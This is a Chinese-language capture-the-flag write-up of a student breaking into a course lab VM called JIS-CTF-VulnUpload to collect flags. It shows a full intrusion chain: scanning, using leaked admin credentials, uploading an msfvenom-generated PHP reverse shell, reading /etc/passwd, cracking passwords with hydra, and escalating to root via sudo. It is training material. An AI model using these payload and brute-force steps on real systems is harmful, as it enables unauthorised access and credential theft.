

### 攻擊主機：Kali_Linux_2019.3 
### 靶機：JIS-CTF-VulnUpload-CTF01
> 這個靶機跟網路上的不太一樣，因為教授改過內容才給我們打。</br>
> ※教授說他忘了放第五支旗

#### 搜尋靶機IP
> **Kali>** <code>arp-scan -l</code> </br>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/e53f9a10-cfff-4cc6-8ea3-7891432dcc6c)</br>
💡：去掉頭跟尾(IP)，確定靶機為 192.168.203.129


#### 弱點掃描
> 使用nmap進行弱掃
**Kali>** <code>nmap -v -sS -O -A -p- 192.168.203.129</code> </br>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/6ced9f28-af7e-4be8-bbe9-12c976a83bc6)</br>
💡得知有開啟22port和80port

#### 先看看http://192.168.203.129
> 意外發現第四支旗
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/1b4aea6e-8720-47a5-a6ab-4ba0bb10bb08) <br/>
> (在Inspect Element中)<br/>
> 解碼之後：<br/>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/90dd9069-88ed-4e84-bb42-b2909b14955f)<br/>
```js
    There is a vuln of upload service on the next page after you log in. Please find the php-reverse-shell.php under /usr/share/webshells/php in kali linux. In order to get the reverse session from target, run nc -lvnp port#. Edit the "CHANGE THIS" in the  php-reverse-shell.php and then upload it :10 points
```
> 這個線索告訴我接下來要用反向工程，但我先把1~3支旗找回來<br/>

#### 使用dirb嘗試看看<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/378d385b-8ddc-4073-9f80-a24841b581d4)<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/954f81f4-387a-4f15-aa83-fdcdeba341ba)<br/>
> 在 http://192.168.203.129/flag 找到第一支旗<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/3029e6e9-a3a2-4390-91ad-1f08fa929ecd)<br/>
```js
    This is a Jimmy's Cyber Class:10 points
```
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/dd47bca4-4bc2-4d34-963a-36900ca3a86b)<br/>
> 並在admin_area中找到第二支旗，還附了admin的帳密<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/b017c504-588b-4e7c-ae12-8f6d97677872)<br/>
```js
    You might have great time in this security class:10 points
```
> 在CSS中找到hint檔案，找到第三支旗<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/eaed5634-4316-43a6-9f16-86afdf364032)<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/e5449597-ff8a-4b4e-a411-86f6ff4b8ead)<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/3577cf9d-dbc5-4caa-87d0-714a526f7033) <br/>
```js
    Of course you know password crack is illegal:10 points
``` 

#### 進入靶機<br/>
> 使用第二支旗給的帳密<br/>
> 在 http://192.168.203.129/login.php (第四支旗的網頁)進入了可以上傳資料的網頁<br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/0c9b6c6b-30d9-4b56-a8dc-dd2da4c0fc21)<br/>
> **使用反向工程**<br/>
> 在我好找的地方養一隻可愛的彩虹小馬<br/>
> <code>msfvenom -p php/reverse_php LHOST=192.168.203.129 LPORT=1234 -f raw > shell.php</code><br/>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/acba887e-1c5f-4741-a252-9417579f4156)<br/>
> 把他上傳<br/>
> 在掃80port的時候注意到有個upload_files，感覺可以讓靶機開我的檔案<br/>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/9beecb0f-a4a7-484b-a481-dad0820cdc88)<br/>
> 在upload_files開啟我的檔案，成功進入靶機<br/>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/1c487e45-5815-4a4c-9833-749ba16edfea)<br/>
> 我這時候只有www-data的權限，做不了甚麼但可以查看使用者<br/>
> <code>Cat /etc/passwd</code><br/>
> 有兩個使用者，Jimmy和technawi可以做密碼破解-->使用hydra<br/>
> 發現Jimmy比較容易破出來<br/>
> 使用Jimmy進行登入<br/>
> 發現bash無法下sudo，故先下bash指令<br/>
> **$** <code>su jimmy</code><br/>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/022276e4-2ed8-40bd-96b1-0c7f8bdf3df3) <br/>
> 成功變成能下sudo的bash
#### 提權成root
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/5589079d-8bfc-476d-8866-874dfbcf173b) </br>
> 成功😄

#### 找漏網之旗
> 在Home資料夾下看到了technawi和.jimmy兩個使用者資料夾</br>
> 在technawi中看到了Jun 5建立(教授放檔案進去的日期，看到這個日期都很可疑)的檔案有flag.txt和.credentials.txt</br>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/c6272d81-d77c-4d3e-bb62-bb1445a703e3)</br>
> 得到第六支旗和第七支旗</br>
```js
    Great! But you need to find other account to execute sudo:15 points
[jimmy] is the account you need to hydra:15 points
``` 

> 在.jimmy中看到了Jun 5建立(教授放檔案進去的日期，看到這個日期都很可疑)的檔案有jimmy.txt</br>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/5c5a9bf1-518a-4ad8-b9b3-d98345ac2c96)</br>
> 得到了第八支旗</br>
```js
   As what we always said: Please protect yourself with these hacking skill:20 points
``` 

> 到root下看看有什麼</br>
> 在Desktop找到了Jun 5建立(教授放檔案進去的日期，看到這個日期都很可疑)的檔案有finish.txt和youseeme.jpg兩個檔案</br>
> ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/7606dc42-08ec-434c-895b-7a522ab874f4)</br>
> 在finish.txt得到第九支旗</br>
```js
    Good JOB! You finished this CTF! Please protect yourself with these hacking skill:20 points
```

![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/896bd863-2f96-4fda-beb7-ba12e9d5f3d7)</br>
> 在youseeme.jpg得到第十支旗</br>
```js
    Look forward to seeing you again, and hope what I shared can help you ^_^ :20 points
```

#### ※補充：教授提供第十支旗的正確解法
> hexdump -C youseeme.jpg |more</br>
![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/d5292577-920b-4e04-a0ae-e6a3e34a1cc6)
</br>







